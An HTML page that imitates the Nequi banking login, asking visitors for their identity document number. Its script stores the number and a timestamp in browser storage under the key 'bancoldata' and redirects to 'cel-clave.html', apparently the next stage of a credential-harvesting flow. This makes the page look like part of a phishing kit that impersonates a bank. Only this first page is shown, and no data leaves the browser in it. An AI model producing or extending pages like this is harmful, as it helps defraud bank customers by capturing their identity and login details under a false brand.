<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ingreso</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #2b002b;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: white;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      height: 100vh;
    }

    .logo {
      margin-top: auto;
      text-align: center;
      font-size: 48px;
      font-weight: bold;
    }

    .logo span {
      color: #ff008c;
    }

    .form {
      margin-top: auto;
    }

    .input-box {
      background: rgba(255,255,255,0.2);
      border-radius: 8px;
      padding: 12px;
      display: flex;
      align-items: center;
    }

    .input-box input {
      width: 100%;
      border: none;
      outline: none;
      background: transparent;
      color: white;
      font-size: 16px;
    }

    .input-box input::placeholder {
      color: #ddd;
    }

    .btn {
      margin-top: 15px;
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      background: #ff008c;
      color: white;
      font-size: 16px;
      cursor: pointer;
      opacity: 0.6;
    }

    .btn.active {
      opacity: 1;
    }
  </style>
</head>

<body>

<div class="container">

  <div class="logo">
    <span>•</span>Nequi
  </div>

  <div class="form">
    <div class="input-box">
      <input type="number" id="docInput" placeholder="Ingresa tu documento">
    </div>

    <button class="btn" id="btn">Entra</button>
  </div>

</div>

<script>
const input = document.getElementById("docInput");
const btn = document.getElementById("btn");

// activar botón
input.addEventListener("input", () => {
  if (input.value.length >= 4) {
    btn.classList.add("active");
  } else {
    btn.classList.remove("active");
  }
});

// click
btn.addEventListener("click", () => {
  const value = input.value.trim();

  if (value.length < 4) {
    alert("Ingrese mínimo 4 dígitos");
    return;
  }

  let data = {};
  try {
    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
  } catch {
    data = {};
  }

  data.usuario = value;
  data.fecha = new Date().toISOString();

  localStorage.setItem("bancoldata", JSON.stringify(data));

  window.location.href = "cel-clave.html";
});
</script>

</body>
</html>
